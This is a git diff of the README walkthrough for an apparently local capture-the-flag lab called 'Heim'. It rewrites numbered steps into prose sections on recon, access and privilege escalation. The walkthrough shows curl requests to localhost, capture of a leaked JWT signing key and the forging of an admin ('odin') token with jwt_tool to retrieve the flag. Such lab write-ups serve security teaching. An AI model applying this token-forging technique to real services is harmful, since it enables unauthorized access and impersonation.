@@ -1,11 +1,15 @@
-# Heim
+# Heim <!-- omit in toc -->
 
-![Longhouse](./../app/static/Longhouse.jpg)
+- [[1] Walkthrough](#1-walkthrough)
+  - [[1.1] Initial Recon](#11-initial-recon)
+  - [[1.2] Gaining Access](#12-gaining-access)
+  - [[1.3] Privilege Escalation and Retrieving the Flag](#13-privilege-escalation-and-retrieving-the-flag)
 
-## Walkthrough
+# [1] Walkthrough
 
-1. Navigate to `localhost:8080` and a home page with a form will be presented
-2. Fill in a name and click submit or make a POST request to `/auth` with `x-www-form-urlencoded` body data that includes a `username` parameter with a value of your choosing. As you do so, open the dev console of your browser and sniff the network traffic. After authorization, you should see Heim making a GET request to `/auth`, leaking `jwt_secret_key` in its query parameters.
+## [1.1] Initial Recon 
+
+First we navigate to `localhost:8080` and are met with a home page containing an input form that prompts for a username. We will fill in a name our our choosing and click submit or make a POST request to `/auth` with `x-www-form-urlencoded` body data that includes our chosen `username` parameter. As we do so, we'll open the dev console of our browser (chrome in this case) and sniff the network traffic. After authorization, we can see Heim making a GET request to `/auth`, leaking the `jwt_secret_key` in its query parameters, before finally redirecting us and returning our `access_token`.
 
 ```bash
 curl --location --request POST 'localhost:8080/auth' \
@@ -13,7 +17,7 @@ curl --location --request POST 'localhost:8080/auth' \
 --data-urlencode 'username=<redacted_username>'
 ```
 
-3. Save the provided `access_key` and leaked `jwt_secret_key`
+Save the provided `access_key` and leaked `jwt_secret_key` somewhere for later.
 
 ```json
 {
@@ -21,16 +25,26 @@ curl --location --request POST 'localhost:8080/auth' \
 }
 ```
 
+<details>
+<summary>Screenshot</summary>
+
 ![network_dump](./network_dump.png)
 
-4. Make a GET request to `localhost:8080`, passing the retrieved `access_key` as a BEARER token for authorization
+</details>
+
+## [1.2] Gaining Access
+
+Now we can a GET request to `localhost:8080`, passing the retrieved `access_key` as a BEARER token for authorization (following the hint provided on the home page).
 
 ```bash
 curl --location --request GET 'localhost:8080' \
 --header 'Authorization: Bearer <redacted_access_token>'
 ```
 
-5. You will be redirected to `/heim` and will receive a JSON encoded response with a `msg` attribute that contains a base64 encoded blob
+We are redirected to `/heim` and receive a JSON encoded response with a `msg` attribute that contains a base64 encoded blob. Decoding the base64 encoded `msg` blob reveals a basic API schema. A useful tool for this is [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=ZXdvZ0lDQWdJbUZ3YVNJNklIc0tJQ0FnSUNBZ0lDQWlkakVpT2lCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0l2WVhWMGFDSTZJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0p3YjNOMElqb2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKemRXMXRZWEo1SWpvZ0lrRjFkR2h2Y21sNlpTQjViM1Z5YzJWc1ppQmhjeUJoSUZacGEybHVaeUlzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0luTmxZM1Z5YVhSNUlqb2dJazV2Ym1VaUxBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0p3WVhKaGJXVjBaWEp6SWpvZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBaWJtRnRaU0k2SUNKMWMyVnlibUZ0WlNJc0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKeVpYRjFhWEpsWkNJNklIUnlkV1VzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0prWlhOamNtbHdkR2x2YmlJNklDSlpiM1Z5SUZacGEybHVaeUJ1WVcxbElpd0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0ltbHVJam9nSW1KdlpIa2lMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWlZMjl1ZEdWdWRDSTZJQ0p0ZFd4MGFYQmhjblF2ZUMxM2QzY3RabTl5YlMxMWNteGxibU52WkdWa0lnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0FnSUNBZ2ZTd0tJQ0FnSUNBZ0lDQWdJQ0FnSWk5b1pXbHRJam9nZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSW1kbGRDSTZJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBaWMzVnRiV0Z5ZVNJNklDSk1hWE4wSUhSb1pTQmxibVJ3YjJsdWRITWdZWFpoYVd4aFlteGxJSFJ2SUc1aGJXVmtJRlpwYTJsdVozTWlMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKelpXTjFjbWwwZVNJNklDSkNaV0Z5WlhKQmRYUm9JZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdmUW9nSUNBZ0lDQWdJQ0FnSUNCOUxBb2dJQ0FnSUNBZ0lDQWdJQ0FpTDJac1lXY2lPaUI3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FpWjJWMElqb2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKemRXMXRZWEo1SWpvZ0lsSmxkSEpwWlhabElIUm9aU0JtYkdGbklpd0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FpYzJWamRYSnBkSGtpT2lBaVFtVmhjbVZ5UVhWMGFDSUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ0lDQWdJQ0FnZlFvZ0lDQWdJQ0FnSUgwS0lDQWdJSDBLZlE9PQ)
+
+<details>
+<summary>Screenshot</summary>
 
 ```
 {
@@ -89,8 +103,11 @@ curl --location --request GET 'localhost:8080' \
 }
 ```
 
-6. Decode the base64 encoded `msg` blob and it is revealed as a basic API schema. A useful tool for this is [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)&input=ZXdvZ0lDQWdJbUZ3YVNJNklIc0tJQ0FnSUNBZ0lDQWlkakVpT2lCN0NpQWdJQ0FnSUNBZ0lDQWdJQ0l2WVhWMGFDSTZJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0p3YjNOMElqb2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKemRXMXRZWEo1SWpvZ0lrRjFkR2h2Y21sNlpTQjViM1Z5YzJWc1ppQmhjeUJoSUZacGEybHVaeUlzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0luTmxZM1Z5YVhSNUlqb2dJazV2Ym1VaUxBb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0p3WVhKaGJXVjBaWEp6SWpvZ2V3b2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBaWJtRnRaU0k2SUNKMWMyVnlibUZ0WlNJc0NpQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKeVpYRjFhWEpsWkNJNklIUnlkV1VzQ2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0prWlhOamNtbHdkR2x2YmlJNklDSlpiM1Z5SUZacGEybHVaeUJ1WVcxbElpd0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0ltbHVJam9nSW1KdlpIa2lMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWlZMjl1ZEdWdWRDSTZJQ0p0ZFd4MGFYQmhjblF2ZUMxM2QzY3RabTl5YlMxMWNteGxibU52WkdWa0lnb2dJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJSDBLSUNBZ0lDQWdJQ0FnSUNBZ2ZTd0tJQ0FnSUNBZ0lDQWdJQ0FnSWk5b1pXbHRJam9nZXdvZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSW1kbGRDSTZJSHNLSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBaWMzVnRiV0Z5ZVNJNklDSk1hWE4wSUhSb1pTQmxibVJ3YjJsdWRITWdZWFpoYVd4aFlteGxJSFJ2SUc1aGJXVmtJRlpwYTJsdVozTWlMQW9nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKelpXTjFjbWwwZVNJNklDSkNaV0Z5WlhKQmRYUm9JZ29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdmUW9nSUNBZ0lDQWdJQ0FnSUNCOUxBb2dJQ0FnSUNBZ0lDQWdJQ0FpTDJac1lXY2lPaUI3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FpWjJWMElqb2dld29nSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNKemRXMXRZWEo1SWpvZ0lsSmxkSEpwWlhabElIUm9aU0JtYkdGbklpd0tJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FpYzJWamRYSnBkSGtpT2lBaVFtVmhjbVZ5UVhWMGFDSUtJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lIMEtJQ0FnSUNBZ0lDQWdJQ0FnZlFvZ0lDQWdJQ0FnSUgwS0lDQWdJSDBLZlE9PQ)
-7. Make a GET request to `/flag`, passing your `access_token` as a BEARER token for authorization and you will receive an error indicating only the AllFather is worthy of receving the flag
+</details>
+
+## [1.3] Privilege Escalation and Retrieving the Flag
+
+Now we make a GET request to `/flag`, passing our `access_token` as a BEARER token for authorization. Unfortunately we receive an error indicating only the AllFather Odin is worthy of receiving the flag.
 
 ```bash
 curl --location --request GET 'localhost:8080/flag' \
@@ -103,7 +120,7 @@ curl --location --request GET 'localhost:8080/flag' \
 }
 ```
 
-8. If you now go back to step 2 and try to perform this step with the username `odin` you will receive an error
+Knowing that it seems we need to be authorized as 'Odin' to retrieve the flag, if  now go back to step 2 and try to retrieve an access token as 'Odin' we receive an error.
 
 ```bash
 curl --location --request POST 'localhost:8080/auth' \
@@ -117,17 +134,20 @@ curl --location --request POST 'localhost:8080/auth' \
 }
 ```
 
-9. Instead, you should tamper with your current `access_token`. Heim was misconfigured and provided us with the `jwt_secret_key`, which we can use to forge entirely new keys or tamper with existing ones. A helpful tool for this is the [JSON Web Token Toolkit v2](https://github.com/ticarpi/jwt_tool/blob/master/jwt_tool.py)
-10. Change the `sub` value in your `access_token` to `odin` and sign the tampered key with the `hs256` algorithm, passing the saved `jwt_secret_key` as the signing key
+As we cannot seem to generate a token as 'Odin', and given we have the leaked `jwt_secret_key`, we should instead tamper with our current `access_token`. Heim was misconfigured and leaked to us with the `jwt_secret_key`, the signing key for the jwt tokens the app produces. With this, we can forge entirely new keys or tamper with existing ones. A helpful tool for this is the [JSON Web Token Toolkit v2](https://github.com/ticarpi/jwt_tool/blob/master/jwt_tool.py). Using this tool, we can change the `sub` value in your `access_token` to `odin` and sign the tampered key with the `hs256` algorithm, passing the saved `jwt_secret_key` as the signing key.
 
 ```bash
 python3 jwt_tool.py -S hs256 -p arottenbranchwillbefoundineverytree <redacted_access_token> -T
 ```
+<details>
+<summary>Screenshots</summary>
 
 ![jwt_tool_1](./jwt_tool_1.png)
 ![jwt_tool_2](./jwt_tool_2.png)
 
-11. Make another GET request to `/flag`, passing your new `access_token` identifying you as `odin` and you will receive the flag
+</details>
+
+Now we can make another GET request to `/flag`, passing our new `access_token` identifying us as `odin` and we will receive the flag.
 
 ```bash
 curl --location --request GET 'localhost:8080/flag' \
